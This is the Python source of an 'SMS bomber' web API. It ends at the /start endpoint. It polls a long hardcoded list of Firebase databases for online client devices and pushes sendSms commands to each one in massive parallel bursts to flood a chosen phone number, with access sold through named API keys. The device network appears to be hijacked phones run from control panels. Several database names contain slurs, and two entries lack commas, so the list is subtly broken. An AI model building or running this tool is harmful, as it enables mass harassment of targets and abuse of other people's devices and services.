#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v11.3 — FINAL EDITION      ║
║   ▸ Vercel v8.1 working number logic (NO auto-91)        ║
║   ▸ START / STOP / STATUS / JOBS endpoints               ║
║   ▸ Firebase URLs HIDDEN (only bronx-boss)               ║
║   ▸ SUPER FAST Parallel firing                           ║
║   ▸ GET + POST both supported                            ║
║   ▸ Unlimited message length (POST)                      ║
║   ▸ count=1 → 1 SMS, count=100 → 100 SMS (exact)         ║
║   ▸ Full Emoji/Symbol/Newline ✅                         ║
║   ▸ Instant /stop (1 second me)                          ║
║   ▸ Render.com Ready                                     ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
from datetime import datetime
from uuid import uuid4

import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS
# ═══════════════════════════════════════════════════════════
PUBLIC_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
}

OWNER_KEYS = {
    "bronx-boss",
}

VALID_KEYS = PUBLIC_KEYS | OWNER_KEYS

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — YAHAN JITNE CHAHO ADD KARO (500+)
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
        "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    "https://adityakaapp-default-rtdb.firebaseio.com",
    "https://amaat-a7916-default-rtdb.firebaseio.com",
    "https://amit-6f40a-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://bali-7acc3-default-rtdb.firebaseio.com",
    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com",
    "https://botsieeee-af07c-default-rtdb.firebaseio.com",
    "https://gadhalalund-default-rtdb.firebaseio.com",
    "https://iiilsoee-default-rtdb.firebaseio.com",
    "https://lucky-c0915-default-rtdb.firebaseio.com",
    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://nidhi-rani-default-rtdb.firebaseio.com",
    "https://nowammyxdd-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://rohitbona-d8308-default-rtdb.firebaseio.com",
    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com",
    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://alwaysatiif7-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://check-skyler-default-rtdb.firebaseio.com",
    "https://chilgumsir-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://deepk-hh-default-rtdb.firebaseio.com",
    "https://desert-fc320-default-rtdb.firebaseio.com",
    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
    "https://gfaatelisell-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://kalih-f389d-default-rtdb.firebaseio.com",
    "https://keepsnss-default-rtdb.firebaseio.com",
    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
    "https://maxo12-default-rtdb.firebaseio.com",
    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
    "https://mook-1ddfc-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "https://sk-paid-panel-default-rtdb.firebaseio.com",
    "https://tinmur-777e8-default-rtdb.firebaseio.com",
    "https://vasu-new-panel-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
    "https://adani-5dd2c-default-rtdb.firebaseio.com",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://kunal-86274-default-rtdb.firebaseio.com",
    "https://sunil-da-default-rtdb.firebaseio.com",
    "https://rk-panell-default-rtdb.firebaseio.com",
    "https://jime-10a55-default-rtdb.firebaseio.com",
    "https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
    "https://saaasaa-c28c1-default-rtdb.firebaseio.com",
    "https://room-hotel-default-rtdb.firebaseio.com",
    "https://subjuoeh-default-rtdb.firebaseio.com",
    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://kunal-86274-default-rtdb.firebaseio.com",
    "https://fwwg-d04bc-default-rtdb.firebaseio.com",
    "https://alok5u2-default-rtdb.firebaseio.com",
    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://project9-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
     "https://dhiraj2323-2409a-default-rtdb.firebaseio.com",
"https://hush-e1f72-default-rtdb.firebaseio.com",
"https://a4jaat-208cb-default-rtdb.firebaseio.com",
"https://babuji-efd18-default-rtdb.firebaseio.com",
"https://sk-paid-panel-default-rtdb.firebaseio.com",
"https://saniapanel-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://sumnmmn-default-rtdb.firebaseio.com",
"https://arunhah-902ef-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://pm-kishan-b4-default-rtdb.firebaseio.com",
"https://rahulbhai-ff15445-default-rtdb.firebaseio.com",
"https://svuhgfgg-default-rtdb.firebaseio.com",
"https://pussy-25f3c-default-rtdb.firebaseio.com",
"https://aryanhaisharma-f2739-default-rtdb.firebaseio.com",
"https://ramji-be5c6-default-rtdb.firebaseio.com",
"https://fir-project-175f2-default-rtdb.firebaseio.com",
"https://santosh-3eeca-default-rtdb.firebaseio.com",
"https://ariyan-kelvin-default-rtdb.firebaseio.com",
"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
"https://rosan-9a68d-default-rtdb.firebaseio.com",
"https://sohan-6d9e1-default-rtdb.firebaseio.com",
"https://davil-d4e77-default-rtdb.firebaseio.com",
"https://ramchandra62-51fbe-default-rtdb.firebaseio.com",
"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
"https://aya-wed-anvith-default-rtdb.firebaseio.com",
"https://babu-2b2c2-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://pm-kisan-15jg-default-rtdb.firebaseio.com",
"https://mkdmoo-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://helloooookk-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://fir-d327e-default-rtdb.firebaseio.com",
"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://suman-7a301-default-rtdb.firebaseio.com",
"https://ship-admin-panel-da53b-default-rtdb.firebaseio.com",
"https://aditya-5959e-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://customer4-ca47c-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://gadhalalund-default-rtdb.firebaseio.com",
"https://sachin-38c1d-default-rtdb.firebaseio.com",
"https://sirsaa-ea24e-default-rtdb.firebaseio.com",
"https://customer-19no-10augu-default-rtdb.firebaseio.com",
"https://gasbooking-15494-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://bibli-roy-default-rtdb.firebaseio.com",
"https://ssboss4-default-rtdb.firebaseio.com",
"https://rahulrnj-6e235-default-rtdb.firebaseio.com",
"https://gollsrka-default-rtdb.firebaseio.com",
"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
"https://room-hotel-default-rtdb.firebaseio.com",
"https://dhiko0909-default-rtdb.firebaseio.com",
"https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
"https://teddymcdonald-81002-default-rtdb.firebaseio.com",
"https://santosh-c4095-default-rtdb.firebaseio.com",
"https://alok5u2-default-rtdb.firebaseio.com",
"https://saaasaa-c28c1-default-rtdb.firebaseio.com",
"https://subjuoeh-default-rtdb.firebaseio.com",
"https://fwwg-d04bc-default-rtdb.firebaseio.com",
"https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
"https://kunal-86274-default-rtdb.firebaseio.com",
"https://rk-panell-default-rtdb.firebaseio.com",
"https://sunil-da-default-rtdb.firebaseio.com",
"https://jime-10a55-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://sannn-5d617-default-rtdb.firebaseio.com",
"https://fir-24851-default-rtdb.firebaseio.com",
"https://mxla-16265-default-rtdb.firebaseio.com",
"https://warsondk-default-rtdb.firebaseio.com",
"https://lvdapanalb-default-rtdb.firebaseio.com",
"https://senu-cbca6-default-rtdb.firebaseio.com",
"https://rahul-admin-b6ebe-default-rtdb.firebaseio.com",
"https://simran-2f56c-default-rtdb.firebaseio.com",
"https://panel-jack-default-rtdb.firebaseio.com",
"https://dippsanj-4fe1c-default-rtdb.firebaseio.com",
"https://akshhhhhhhh-default-rtdb.firebaseio.com",
"https://kaha-9d4ce-default-rtdb.firebaseio.com",
"https://super-admin-240f4-default-rtdb.firebaseio.com",
"https://ilohsh-default-rtdb.firebaseio.com",
    "https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://a4jaat-208cb-default-rtdb.firebaseio.com",
"https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://sanjay-16691-default-rtdb.firebaseio.com",
"https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com",
"https://saniapanel-default-rtdb.firebaseio.com",
"https://sumnmmn-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://crdio-3cf5c-default-rtdb.firebaseio.com",
"https://sk-paid-panel-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
"https://himanmi-936db-default-rtdb.firebaseio.com",
"https://ariyan-kelvin-default-rtdb.firebaseio.com",
"https://pm-kishan-b4-default-rtdb.firebaseio.com",
"https://hyper-cheat-3f53a-default-rtdb.firebaseio.com",
"https://fir-e8ad7-default-rtdb.firebaseio.com",
"https://davil-d4e77-default-rtdb.firebaseio.com",
"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
"https://santosh-3eeca-default-rtdb.firebaseio.com",
"https://ramchandra62-51fbe-default-rtdb.firebaseio.com",
"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
"https://pm-kisan-15jg-default-rtdb.firebaseio.com",
"https://mkdmoo-default-rtdb.firebaseio.com",
"https://rosan-9a68d-default-rtdb.firebaseio.com",
"https://aya-wed-anvith-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://babu-2b2c2-default-rtdb.firebaseio.com",
"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://pnb-one-a13-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://helloooookk-default-rtdb.firebaseio.com",
"https://suman-7a301-default-rtdb.firebaseio.com",
"https://aditya-5959e-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://customer4-ca47c-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://fir-d327e-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://ship-admin-panel-da53b-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://gadhalalund-default-rtdb.firebaseio.com"
"https://sachin-38c1d-default-rtdb.firebaseio.com",
"https://customer-19no-10augu-default-rtdb.firebaseio.com",
"https://sirsaa-ea24e-default-rtdb.firebaseio.com",
"https://gasbooking-15494-default-rtdb.firebaseio.com",
"https://jime-10a55-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://fir-24851-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://nisha-randi-default-rtdb.firebaseio.com",
"https://yohichahiye-default-rtdb.firebaseio.com",
"https://krisna574-ffef3-default-rtdb.firebaseio.com",
"https://lvdapanalb-default-rtdb.firebaseio.com",
"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
"https://warsondk-default-rtdb.firebaseio.com",
"https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://teligrampmsell-default-rtdb.firebaseio.com",
"https://fir-d327e-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://mpariwhan-default-rtdb.firebaseio.com",
"https://aaaa-3bd33-default-rtdb.firebaseio.com",
"https://mxla-16265-default-rtdb.firebaseio.com",
"https://navin-9fb56-default-rtdb.firebaseio.com",
"https://ilohsh-default-rtdb.firebaseio.com",
"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://babuji-efd18-default-rtdb.firebaseio.com",
"https://dhiraj2323-2409a-default-rtdb.firebaseio.com",
"https://saniapanel-default-rtdb.firebaseio.com",
"https://crdio-3cf5c-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://ariyan-kelvin-default-rtdb.firebaseio.com",
"https://himanmi-936db-default-rtdb.firebaseio.com",
"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
"https://rosan-9a68d-default-rtdb.firebaseio.com",
"https://davil-d4e77-default-rtdb.firebaseio.com",
"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
"https://babu-2b2c2-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://mkdmoo-default-rtdb.firebaseio.com",
"https://aya-wed-anvith-default-rtdb.firebaseio.com",
"https://helloooookk-default-rtdb.firebaseio.com",
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://a4jaat-208cb-default-rtdb.firebaseio.com"
"https://harami-fe6e1-default-rtdb.firebaseio.com",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
"https://naina-singh-default-rtdb.firebaseio.com",
"https://hshshhs-51f68-default-rtdb.firebaseio.com",
"https://myname-cc45a-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://aaaa-3bd33-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
"https://warsondk-default-rtdb.firebaseio.com",
"https://yohichahiye-default-rtdb.firebaseio.com",
"https://rahul6494-f9457-default-rtdb.firebaseio.com",
"https://teligrampmsell-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://krisna574-ffef3-default-rtdb.firebaseio.com",
"https://lvdapanalb-default-rtdb.firebaseio.com",
"https://a4jaat-208cb-default-rtdb.firebaseio.com",
"https://mr-sapyedr-default-rtdb.firebaseio.com",
]

# ═══════════════════════════════════════════════════════════
# 🧹 AUTO DEDUPE
# ═══════════════════════════════════════════════════════════
def dedupe_firebases(urls):
    seen, out = set(), []
    for u in urls:
        if not u or not isinstance(u, str):
            continue
        u = u.strip().rstrip("/")
        if u.endswith(".json"):
            u = u[:-5]
        if u.startswith("http") and u not in seen:
            seen.add(u)
            out.append(u)
    return out

FIREBASE_URLS = dedupe_firebases(FIREBASE_URLS)

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

# ═══════════════════════════════════════════════════════════
# ⚙️ ULTRA FAST SETTINGS
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 5000
BATCH_CHUNK = 10000
REQUEST_TIMEOUT = 8
CONNECT_TIMEOUT = 3
DEVICE_CACHE_TTL = 60
MAX_PER_DEVICE = 0   # 0 = unlimited

API_NAME = "@BRONX_ULTRA"
API_VERSION = "11.3"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(title=f"🔥 {API_NAME} API", version=API_VERSION)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# 🔴 REDIS (OPTIONAL)
# ═══════════════════════════════════════════════════════════
redis = None
try:
    REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
    REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
    if REDIS_URL and REDIS_TOKEN:
        from upstash_redis.asyncio import Redis
        redis = Redis(url=REDIS_URL, token=REDIS_TOKEN)
        print("✅ Redis connected")
except Exception as e:
    print(f"⚠️ Redis skipped: {e}")

# ═══════════════════════════════════════════════════════════
# 🗂️ GLOBAL STATE
# ═══════════════════════════════════════════════════════════
_LOCAL_STOP = set()
_DEVICE_CACHE = {"devices": None, "ts": 0}
_JOBS = {}
_RUNNING_TASKS = {}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    return bool(api_key) and api_key.strip() in VALID_KEYS


def is_owner(api_key: str) -> bool:
    return bool(api_key) and api_key.strip() in OWNER_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key
    key = body_data.get("key") or body_data.get("api_key")
    return key or ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


def fix_message(raw_message, is_get: bool) -> str:
    """Full emoji/symbol/newline support."""
    if raw_message is None:
        return ""
    if not isinstance(raw_message, str):
        raw_message = str(raw_message)
    msg = raw_message
    if is_get:
        msg = msg.replace("+", " ")
    msg = msg.replace("\\n", "\n").replace("\\t", "\t")
    return msg


def norm_number(n: str) -> str:
    """
    ✅ VERCEL v8.1 LOGIC — NO AUTO-91
    Sirf +, space, - hatao. Kuch mat add karo.
    User jaisa bhejega waisa hi jayega.
    """
    return str(n).replace("+", "").replace(" ", "").replace("-", "").strip()


# ═══════════════════════════════════════════════════════════
# 📡 DEVICE FETCH
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            devices = []
            for k, v in data.items():
                if not isinstance(v, dict):
                    continue
                status = v.get("status")
                if status in (True, "true", 1, "1", "online", "active", "Active", "ONLINE"):
                    devices.append({"id": k, "url": base})
            return devices
    except Exception:
        return []


async def get_all_devices(session, use_cache=True):
    if use_cache:
        age = time.time() - _DEVICE_CACHE["ts"]
        if _DEVICE_CACHE["devices"] and age < DEVICE_CACHE_TTL:
            return _DEVICE_CACHE["devices"]
    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)
    _DEVICE_CACHE["devices"] = out
    _DEVICE_CACHE["ts"] = time.time()
    return out


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, stats):
    payload = {
        "from": 1,
        "to": target,
        "message": message,
        "isSended": False,
        "timestamp": int(time.time() * 1000),
    }

    for attempt in range(2):
        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"
            try:
                async with session.put(url, json=payload) as r:
                    if r.status in (200, 201):
                        stats["success"] += 1
                        return True
                    if r.status == 403:
                        stats["blocked"] += 1
                        return False
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        if attempt == 0:
            await asyncio.sleep(0.1)

    stats["failed"] += 1
    return False


async def is_stopped(number: str) -> bool:
    if number in _LOCAL_STOP:
        return True
    if redis:
        try:
            val = await redis.get(f"stop:{number}")
            return val is not None
        except Exception:
            pass
    return False


# ═══════════════════════════════════════════════════════════
# 💣 BOMB WORKER v11.3
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str, jid: str):
    t0 = time.time()

    if redis:
        try:
            await redis.delete(f"stop:{number}")
        except Exception:
            pass
    _LOCAL_STOP.discard(number)

    effective_count = count if MAX_PER_DEVICE == 0 else min(count, MAX_PER_DEVICE)

    connector = aiohttp.TCPConnector(
        limit=0, limit_per_host=0, ttl_dns_cache=600,
        force_close=False, enable_cleanup_closed=True,
        use_dns_cache=True, keepalive_timeout=60,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT,
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=True)
        if not devices:
            print(f"[{jid}] ❌ No online devices")
            _JOBS[jid]["status"] = "no_devices"
            _RUNNING_TASKS.pop(number, None)
            return

        ndev = len(devices)
        total = ndev * effective_count

        print(f"\n{'='*60}")
        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION}")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Message    : {message[:80]}")
        print(f"[{jid}] Devices    : {ndev} ONLINE")
        print(f"[{jid}] Per-device : {effective_count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*60}")

        _JOBS[jid].update({
            "total": total,
            "devices": ndev,
            "status": "running",
            "started_at": time.time(),
        })

        stats = {"success": 0, "failed": 0, "blocked": 0}
        sem = asyncio.Semaphore(MAX_CONCURRENT)

        async def guarded_send(device):
            async with sem:
                return await send_one(session, device, number, message, stats)

        all_tasks = []
        for device in devices:
            for _ in range(effective_count):
                all_tasks.append(guarded_send(device))

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests...")

        completed = 0
        cancelled = False
        for i in range(0, total_tasks, BATCH_CHUNK):
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                cancelled = True
                for t in all_tasks[i:]:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*all_tasks[i:], return_exceptions=True)
                break

            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)

            _JOBS[jid].update({
                "done": completed,
                "ok": stats["success"],
                "blk": stats["blocked"],
                "fail": stats["failed"],
            })

            elapsed_sf = time.time() - t0
            speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                  f"FAIL={stats['failed']} | {elapsed_sf:.1f}s | {speed_sf}/s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        _JOBS[jid].update({
            "status": "stopped" if cancelled else "completed",
            "ok": stats["success"],
            "blk": stats["blocked"],
            "fail": stats["failed"],
            "elapsed": elapsed,
            "speed": speed,
            "finished_at": time.time(),
        })

        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄🚄🚀")
        print(f"{'='*60}\n")

    _RUNNING_TASKS.pop(number, None)


# ═══════════════════════════════════════════════════════════
# 🌐 ROOT
# ═══════════════════════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def root():
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>{API_NAME} v{API_VERSION}</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            body{{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}}
            h1{{color:#f00;text-shadow:0 0 10px #f00;}}
            .box{{border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:8px;background:#111;}}
            code{{background:#222;padding:2px 6px;color:#0ff;border-radius:4px;}}
            .stat{{color:#ff0;font-size:20px;}}
            pre{{background:#000;padding:10px;border-radius:6px;overflow-x:auto;color:#0ff;}}
        </style>
    </head>
    <body>
        <h1>🔥 {API_NAME} v{API_VERSION} — FINAL</h1>
        <div class="box">
            <div class="stat">Status: 🟢 ONLINE</div>
            <div>Mode: <b>BEAST MODE v11.3</b></div>
            <div>Number: <b>No auto-91 (Vercel logic)</b></div>
        </div>
        <div class="box">
            <h3>🚀 START (POST — best)</h3>
            <pre>POST /start
{{
  "key": "bronx-op",
  "number": "9876543210",
  "message": "Hello 🔥",
  "count": 5
}}</pre>
        </div>
        <div class="box">
            <h3>🚀 START (GET)</h3>
            <pre>GET /start?key=KEY&number=9876543210&message=Hi&count=5</pre>
        </div>
        <div class="box">
            <h3>🛑 STOP</h3>
            <pre>GET /stop?key=KEY&number=9876543210</pre>
            <pre>GET /stop?key=KEY&job_id=abc12345</pre>
        </div>
        <div class="box">
            <h3>📊 STATUS</h3>
            <pre>GET /status?key=KEY&job_id=abc12345</pre>
            <pre>GET /jobs?key=KEY</pre>
        </div>
        <div class="box">
            <h3>🧪 TEST (owner only)</h3>
            <pre>GET /test?key=bronx-boss</pre>
        </div>
    </body>
    </html>
    """


@app.get("/health")
async def health():
    return {"status": "ok", "version": API_VERSION, "time": datetime.now().isoformat()}


# ═══════════════════════════════════════════════════════════
# 🧪 /test — Devices check (OWNER ONLY)
# ═══════════════════════════════════════════════════════════
@app.get("/test")
async def test_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not is_owner(api_key):
        return JSONResponse({"success": False, "error": "🔒 Owner only"}, 403)

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=30, connect=5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        devices = await get_all_devices(session, use_cache=False)

    return {
        "success": True,
        "total_devices": len(devices),
        "message": f"✅ {len(devices)} devices online — ready to fire!",
    }


# ═══════════════════════════════════════════════════════════
# 🚀 /start — Job start
# ═══════════════════════════════════════════════════════════
